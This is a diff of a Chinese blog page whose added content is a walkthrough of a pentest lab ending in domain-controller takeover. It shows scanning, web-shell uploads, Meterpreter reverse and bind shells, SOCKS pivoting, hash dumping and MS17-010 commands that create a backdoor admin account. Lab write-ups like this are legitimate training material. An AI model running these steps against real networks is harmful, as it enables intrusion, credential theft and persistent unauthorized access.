@@ -6,17 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://kriller.me">
-  <title>Archives | Hexo</title>
+  <title>Hexo</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta property="og:type" content="website">
+  <meta name="description" content="暗月内网靶场项目⑦WP：攻击机：Kali 192.168.132.128 主机发现  端口扫描  服务识别  web打点  漏洞利用 ：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657netdiscover -i eth0 -r 192.">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://kriller.me/archives/page/5/">
+<meta property="og:url" content="http://kriller.me/2021/11/17/%E6%9A%97%E6%9C%88%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E9%A1%B9%E7%9B%AE7WP%EF%BC%9A/">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="暗月内网靶场项目⑦WP：攻击机：Kali 192.168.132.128 主机发现  端口扫描  服务识别  web打点  漏洞利用 ：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657netdiscover -i eth0 -r 192.">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/11/18/O1RmyVUEz3ArjqT.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/18/RYKOtfBAVzDIeNs.png">
+<meta property="article:published_time" content="2021-11-17T14:34:04.869Z">
+<meta property="article:modified_time" content="2021-11-17T16:27:03.903Z">
 <meta property="article:author" content="麦芽糖吖">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/11/18/O1RmyVUEz3ArjqT.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -220,528 +227,204 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-暗月内网靶场项目7WP：" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+  <div class="article-entry" itemprop="articleBody">
     
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
+    <h3 id="暗月内网靶场项目⑦WP："><a href="#暗月内网靶场项目⑦WP：" class="headerlink" title="暗月内网靶场项目⑦WP："></a>暗月内网靶场项目⑦WP：</h3><p>攻击机：Kali 192.168.132.128</p>
+<h4 id="主机发现-端口扫描-服务识别-web打点-漏洞利用-："><a href="#主机发现-端口扫描-服务识别-web打点-漏洞利用-：" class="headerlink" title="主机发现  端口扫描  服务识别  web打点  漏洞利用 ："></a>主机发现  端口扫描  服务识别  web打点  漏洞利用 ：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.132.0&#x2F;24 </span><br><span class="line">   IP            At MAC Address     Count     Len  MAC Vendor &#x2F; Hostname      </span><br><span class="line"> -----------------------------------------------------------------------------</span><br><span class="line"> 192.168.132.2   00:50:56:f5:b9:e8      3     180  VMware, Inc.                                                                                                                                    </span><br><span class="line"> 192.168.132.138 00:0c:29:74:26:e7     17    1020  VMware, Inc.                                                                                                                                    </span><br><span class="line"> 192.168.132.254 00:50:56:e9:c7:68      2     120  VMware, Inc.</span><br><span class="line">masscan  192.168.132.138  -p 1-65535 --rate&#x3D;100  #先探测端口</span><br><span class="line">Discovered open port 21&#x2F;tcp on 192.168.132.138                                 </span><br><span class="line">Discovered open port 999&#x2F;tcp on 192.168.132.138                                </span><br><span class="line">Discovered open port 80&#x2F;tcp on 192.168.132.138                                 </span><br><span class="line">Discovered open port 5985&#x2F;tcp on 192.168.132.138                               </span><br><span class="line">Discovered open port 6588&#x2F;tcp on 192.168.132.138   </span><br><span class="line">nmap -sV -p -Pn 3389,5985,6588,999,21,80 -A 192.168.132.138 -oA attack-ports  #探测服务</span><br><span class="line">xsltproc -o attack.html mode.xsl attack-ports.xml #美化（可选）</span><br><span class="line">    PORT     STATE    SERVICE       VERSION</span><br><span class="line">    21&#x2F;tcp   open     ftp           Microsoft ftpd</span><br><span class="line">    | ftp-syst: </span><br><span class="line">    |_  SYST: Windows_NT</span><br><span class="line">    80&#x2F;tcp   open     http          Microsoft IIS httpd 10.0</span><br><span class="line">    |_http-server-header: Microsoft-IIS&#x2F;10.0</span><br><span class="line">    |_http-title: IIS Windows Server</span><br><span class="line">    999&#x2F;tcp  open     http          Microsoft IIS httpd 10.0</span><br><span class="line">    | http-robots.txt: 1 disallowed entry </span><br><span class="line">    |_&#x2F;</span><br><span class="line">    |_http-server-header: Microsoft-IIS&#x2F;10.0</span><br><span class="line">    |_http-title: phpMyAdmin</span><br><span class="line">    3389&#x2F;tcp filtered ms-wbt-server</span><br><span class="line">    5985&#x2F;tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">    |_http-server-header: Microsoft-HTTPAPI&#x2F;2.0</span><br><span class="line">    |_http-title: Not Found</span><br><span class="line">    6588&#x2F;tcp open     http          Microsoft IIS httpd 10.0</span><br><span class="line">    | http-cookie-flags: </span><br><span class="line">    |   &#x2F;: </span><br><span class="line">    |     ASPSESSIONIDSCQSQCSR: </span><br><span class="line">    |_      httponly flag not set</span><br><span class="line">    |_http-server-header: Microsoft-IIS&#x2F;10.0</span><br><span class="line">    |_http-title: \xBB\xA4\xCE\xC0\xC9\xF1\xA1\xA4\xD6\xF7\xBB\xFA\xB4\xF3\xCA\xA6 V3.5.1 - \xC7\xB0\xCC\xA8\xB5\xC7\xC2\xBC</span><br><span class="line">    MAC Address: 00:0C:29:74:26:E7 (VMware)</span><br><span class="line">    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">    Device type: general purpose</span><br><span class="line">    Running: Microsoft Windows 2016</span><br><span class="line">    OS CPE: cpe:&#x2F;o:microsoft:windows_server_2016</span><br><span class="line">    OS details: Microsoft Windows Server 2016</span><br><span class="line">    Network Distance: 1 hop</span><br><span class="line">    Service Info: OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line">访问80web：发现robost.txt  识别出指纹siteserver</span><br><span class="line">利用密码重置漏洞登录后台：</span><br><span class="line">利用后台文件上传漏洞getshell：</span><br><span class="line">蚂蚁连接一下，上传免杀exe 得到msfsession</span><br><span class="line">    msf6 exploit(multi&#x2F;handler) &gt; set lhost 192.168.132.128</span><br><span class="line">    lhost &#x3D;&gt; 192.168.132.128</span><br><span class="line">    msf6 exploit(multi&#x2F;handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">    [*] Started reverse TCP handler on 192.168.132.128:4444 </span><br><span class="line">    [*] Sending stage (200262 bytes) to 192.168.132.138</span><br><span class="line">    [*] Meterpreter session 1 opened (192.168.132.128:4444 -&gt; 192.168.132.138:50620) at 2021-11-17 10:32:45 -0500</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line">#信息收集  提升权限</span><br><span class="line">getsystem</span><br><span class="line">#获取网段  自动路由 主机存活</span><br><span class="line">	meterpreter &gt; run autoroute -s 10.10.1.0&#x2F;24</span><br><span class="line">	meterpreter &gt; run get_local_subnets</span><br><span class="line">    [!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">    [!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line">    Local subnet: 10.10.1.0&#x2F;255.255.255.0</span><br><span class="line">    Local subnet: 192.168.132.0&#x2F;255.255.255.0</span><br><span class="line">    meterpreter &gt; run arp_scanner -r 10.10.1.0&#x2F;24</span><br><span class="line">    [*] ARP Scanning 10.10.1.0&#x2F;24</span><br><span class="line">    [*] IP: 10.10.1.128 MAC 00:0c:29:74:26:f1</span><br><span class="line">    [*] IP: 10.10.1.130 MAC 00:0c:29:47:d3:50</span><br><span class="line">    [*] IP: 10.10.1.254 MAC 00:50:56:f2:99:e5</span><br><span class="line">    [*] IP: 10.10.1.255 MAC 00:0c:29:74:26:f1</span><br><span class="line">#socks代理 端口扫描  服务探测</span><br><span class="line">search socks </span><br><span class="line">use 0</span><br><span class="line">set srvhost</span><br><span class="line">run</span><br><span class="line">vim &#x2F;etc&#x2F;proxychains4</span><br><span class="line">proxychains masscan  192.168.132.138  -p 1-65535 --rate&#x3D;100  #先探测端口</span><br><span class="line">proxychains nmap -sT -sV -Pn -n -p  80,139,445,21,3389,3306  --script&#x3D;smb-vuln-ms* 192.168.132.133 #代理的情况下这样写不然会报错 </span><br><span class="line"></span><br><span class="line">    PORT     STATE  SERVICE       VERSION</span><br><span class="line">    21&#x2F;tcp   closed ftp</span><br><span class="line">    80&#x2F;tcp   open   http          nginx</span><br><span class="line">    139&#x2F;tcp  open   netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">    445&#x2F;tcp  open   microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">    3306&#x2F;tcp closed mysql</span><br><span class="line">    3389&#x2F;tcp closed ms-wbt-server</span><br><span class="line">    Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">    Host script results:</span><br><span class="line">    |_smb-vuln-ms10-054: false</span><br><span class="line">    |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED</span><br><span class="line"></span><br><span class="line">或者使用msf进行端口扫描  search portscan  use tcpscan  show options  速度比masscan快很多</span><br><span class="line">    msf6 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; run</span><br><span class="line">    [+] 10.10.1.130:          - 10.10.1.130:80 - TCP OPEN</span><br><span class="line">    [+] 10.10.1.130:          - 10.10.1.130:110 - TCP OPEN</span><br><span class="line">    [+] 10.10.1.130:          - 10.10.1.130:135 - TCP OPEN</span><br><span class="line">    [+] 10.10.1.130:          - 10.10.1.130:139 - TCP OPEN</span><br><span class="line">    [+] 10.10.1.130:          - 10.10.1.130:445 - TCP OPEN</span><br><span class="line">发现存在80web服务:</span><br><span class="line">#端口转发  漏洞利用</span><br><span class="line">portfwd add -l 80 -p 80 -r 10.10.1.132</span><br><span class="line">meterpreter &gt; portfwd add -l 80 -p 80 -r 10.10.1.130</span><br><span class="line">[*] Local TCP relay created: :80 &lt;-&gt; 10.10.1.130:80</span><br><span class="line">本地访问  发现是通达oa  搜索exp  通过任意文件上传getshell  上传免杀exe  使用bind_tcp 获取session2</span><br><span class="line">    msf6 exploit(multi&#x2F;handler) &gt; set rhost 10.10.1.130</span><br><span class="line">    rhost &#x3D;&gt; 10.10.1.130</span><br><span class="line">    msf6 exploit(multi&#x2F;handler) &gt; exploit </span><br><span class="line">    [*] Started bind TCP handler against 10.10.1.130:4444</span><br><span class="line">    [*] Sending stage (200262 bytes) to 10.10.1.130</span><br><span class="line">    [*] Meterpreter session 2 opened (10.10.1.128:53009 -&gt; 10.10.1.130:4444) at 2021-11-17 10:59:40 -0500</span><br><span class="line">继续上面的流程  提权 获取网络环境 定位域控 </span><br><span class="line">    meterpreter &gt; run get_local_subnets </span><br><span class="line">    [!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">    [!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line">    Local subnet: 10.10.1.0&#x2F;255.255.255.0</span><br><span class="line">    Local subnet: 10.10.10.0&#x2F;255.255.255.0</span><br><span class="line">    meterpreter &gt; run autoroute  -s 10.10.10.0&#x2F;24</span><br><span class="line">    [!] Meterpreter scripts are deprecated. Try post&#x2F;multi&#x2F;manage&#x2F;autoroute.</span><br><span class="line">    [!] Example: run post&#x2F;multi&#x2F;manage&#x2F;autoroute OPTION&#x3D;value [...]</span><br><span class="line">    [*] Adding a route to 10.10.10.0&#x2F;255.255.255.0...</span><br><span class="line">    [+] Added route to 10.10.10.0&#x2F;255.255.255.0 via 10.10.1.130</span><br><span class="line">    [*] Use the -p option to list all active routes</span><br><span class="line">获取到ntlm hash  解密</span><br><span class="line">    meterpreter &gt; hashdump </span><br><span class="line">    Administrator:500:aad3b435b51404eeaad3b435b51404ee:357bec0ee1f524c62ba536fcd3f74472:::</span><br><span class="line">    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">定位到10.10.10.165为域控DC</span><br><span class="line">继续对dc进行信息收集 </span><br><span class="line">proxychains nmap -sT -sV -Pn -n -p  80,139,445,21,3389,3306  --script&#x3D;smb-vuln-ms* 10.10.10.165</span><br><span class="line">    PORT     STATE  SERVICE       VERSION</span><br><span class="line">    21&#x2F;tcp   closed ftp</span><br><span class="line">    80&#x2F;tcp   closed http</span><br><span class="line">    139&#x2F;tcp  open   netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">    445&#x2F;tcp  open   microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: ATTACK)</span><br><span class="line">    3306&#x2F;tcp closed mysql</span><br><span class="line">    3389&#x2F;tcp open   ms-wbt-server Microsoft Terminal Services</span><br><span class="line">    Service Info: Host: DC; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">    Host script results:</span><br><span class="line">    |_smb-vuln-ms10-054: false</span><br><span class="line">    |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED</span><br><span class="line">    | smb-vuln-ms17-010: </span><br><span class="line">    |   VULNERABLE:</span><br><span class="line">    |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">    |     State: VULNERABLE</span><br><span class="line">    |     IDs:  CVE:CVE-2017-0143</span><br><span class="line">    |     Risk factor: HIGH</span><br><span class="line">    |       A critical remote code execution vulnerability exists in Microsoft SMBv1</span><br><span class="line">    |        servers (ms17-010).</span><br><span class="line">    |           </span><br><span class="line">    |     Disclosure date: 2017-03-14</span><br><span class="line">    |     References:</span><br><span class="line">    |       https:&#x2F;&#x2F;blogs.technet.microsoft.com&#x2F;msrc&#x2F;2017&#x2F;05&#x2F;12&#x2F;customer-guidance-for-wannacrypt-attacks&#x2F;</span><br><span class="line">    |       https:&#x2F;&#x2F;technet.microsoft.com&#x2F;en-us&#x2F;library&#x2F;security&#x2F;ms17-010.aspx</span><br><span class="line">    |_      https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name&#x3D;CVE-2017-0143</span><br><span class="line">探测到3389服务 http服务 以及可能存在ms17010漏洞</span><br><span class="line">尝试利用ms17010 反弹session失败  但是可以执行命令</span><br><span class="line">于是添加用户 并加入管理员组  然后端口转发 将3389转发到kali本地 用本机win10去连接远程桌面</span><br><span class="line">    msf6 auxiliary(admin&#x2F;smb&#x2F;ms17_010_command) &gt; run</span><br><span class="line"></span><br><span class="line">    [*] 10.10.10.165:445      - Target OS: Windows Server 2016 Standard 14393</span><br><span class="line">    [*] 10.10.10.165:445      - Built a write-what-where primitive...</span><br><span class="line">    [+] 10.10.10.165:445      - Overwrite complete... SYSTEM session obtained!</span><br><span class="line">    [+] 10.10.10.165:445      - Service start timed out, OK if running a command or non-service executable...</span><br><span class="line">    [*] 10.10.10.165:445      - Getting the command output...</span><br><span class="line">    [*] 10.10.10.165:445      - Executing cleanup...</span><br><span class="line">    [+] 10.10.10.165:445      - Cleanup was successful</span><br><span class="line">    [+] 10.10.10.165:445      - Command completed successfully!</span><br><span class="line">    [*] 10.10.10.165:445      - Output for &quot;net user abc !@#QWEasd123 &#x2F;add&quot;:</span><br><span class="line"></span><br><span class="line">    �����ɹ����ɡ�</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    [*] 10.10.10.165:445      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">    [*] Auxiliary module execution completed</span><br><span class="line">    msf6 auxiliary(admin&#x2F;smb&#x2F;ms17_010_command) &gt; set command net localgroup administrators abc &#x2F;add</span><br><span class="line">    command &#x3D;&gt; net localgroup administrators abc &#x2F;add</span><br><span class="line">    msf6 auxiliary(admin&#x2F;smb&#x2F;ms17_010_command) &gt; run</span><br><span class="line"></span><br><span class="line">    [*] 10.10.10.165:445      - Target OS: Windows Server 2016 Standard 14393</span><br><span class="line">    [*] 10.10.10.165:445      - Built a write-what-where primitive...</span><br><span class="line">    [+] 10.10.10.165:445      - Overwrite complete... SYSTEM session obtained!</span><br><span class="line">    [+] 10.10.10.165:445      - Service start timed out, OK if running a command or non-service executable...</span><br><span class="line">    [*] 10.10.10.165:445      - Getting the command output...</span><br><span class="line">    [*] 10.10.10.165:445      - Executing cleanup...</span><br><span class="line">    [+] 10.10.10.165:445      - Cleanup was successful</span><br><span class="line">    [+] 10.10.10.165:445      - Command completed successfully!</span><br><span class="line">    [*] 10.10.10.165:445      - Output for &quot;net localgroup administrators abc &#x2F;add&quot;:</span><br><span class="line"></span><br><span class="line">    �����ɹ����ɡ�</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    [*] 10.10.10.165:445      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">    [*] Auxiliary module execution completed</span><br><span class="line">    </span><br><span class="line">    portfwd add -l 3389 -p 3389 -r 10.10.10.165</span><br><span class="line">    # netstat -tnlp</span><br><span class="line">    Active Internet connections (only servers)</span><br><span class="line">    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID&#x2F;Program name    </span><br><span class="line">    tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1721&#x2F;ruby           </span><br><span class="line">    tcp        0      0 127.0.0.1:1080          0.0.0.0:*               LISTEN      1721&#x2F;ruby           </span><br><span class="line">    tcp        0      0 0.0.0.0:3389            0.0.0.0:*               LISTEN      1721&#x2F;ruby           </span><br><span class="line">    tcp        0      0 127.0.0.1:1089          0.0.0.0:*               LISTEN      1721&#x2F;ruby    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/11/18/O1RmyVUEz3ArjqT.png" alt="image-20211118002527585"></p>
+<h4 id="成功拿到域控DC。"><a href="#成功拿到域控DC。" class="headerlink" title="成功拿到域控DC。"></a>成功拿到域控DC。</h4><p><img src="https://i.loli.net/2021/11/18/RYKOtfBAVzDIeNs.png" alt="image-20211118002639289"></p>
+
+    
+
+    
+    <div class="page-reward">
+      <a href="javascript:void(0);" class="page-reward-btn tooltip-top" target="_self">
+        <div class="tooltip tooltip-east">
+          <span class="tooltip-item">
+            赏
+          </span>
+          <span class="tooltip-content">
+            <span class="tooltip-text">
+              <span class="tooltip-inner">
+                <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i
+                    class="icon icon-quo-right"></i></p>
+                <div class="reward-box">
+                  
+                  <div class="reward-box-item">
+                    <img class="reward-img" src="/img/alipay.jpg">
+                    <span class="reward-type">支付宝</span>
+                  </div>
+                  
+                  
+                  <div class="reward-box-item">
+                    <img class="reward-img" src="/img/weixin.png">
+                    <span class="reward-type">微信</span>
+                  </div>
+                  
+                </div>
+              </span>
+            </span>
+          </span>
         </div>
-        <div class="archives">
+      </a>
+    </div>
     
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2021/01/16/XSS%E5%AD%A6%E4%B9%A002-%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" class="archive-article-date">
-        <time datetime="2021-01-16T14:30:56.781Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-16</time>
-</a>
 
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2021/01/16/XSS%E5%AD%A6%E4%B9%A002-%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/">XSS学习02-反射型xss</a>
-	
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
+    
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          麦芽糖吖
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="http://kriller.me/2021/11/17/暗月内网靶场项目7WP：/" title="" target="_blank">http://kriller.me/2021/11/17/暗月内网靶场项目7WP：/</a>
+        </li>
+        
+        <li>
+          <strong>版权声明： </strong>
           
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">XSS</a>
-        		</li>
-      		
-		</ul>
-	</div>
+          本博客所有文章除特别声明外，均采用 <a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/blob/master/LICENSE" rel="external nofollow" target="_blank">MIT</a> 许可协议。转载请注明出处！
+        </li>
+        
+      </ul>
+    </div>
+    
 
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/渗透测试//" class="article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
 
+    
 
+    
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a> -->
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://kriller.me/2021/11/17/%E6%9A%97%E6%9C%88%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E9%A1%B9%E7%9B%AE7WP%EF%BC%9A/" alt="微信分享二维码"> -->
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+
+    
+    <div class="clearfix"></div>
+  </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2021/01/16/XSS01/" class="archive-article-date">
-        <time datetime="2021-01-16T14:23:53.274Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-16</time>
-</a>
 
+
+<nav id="article-nav">
+  
+    <a href="/2021/11/20/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/11/14/msf%20%E8%87%AA%E5%8A%A8%E8%B7%AF%E7%94%B1+sock%E4%BB%A3%E7%90%86%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2021/01/16/XSS01/">XSS学习01</a>
-	
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
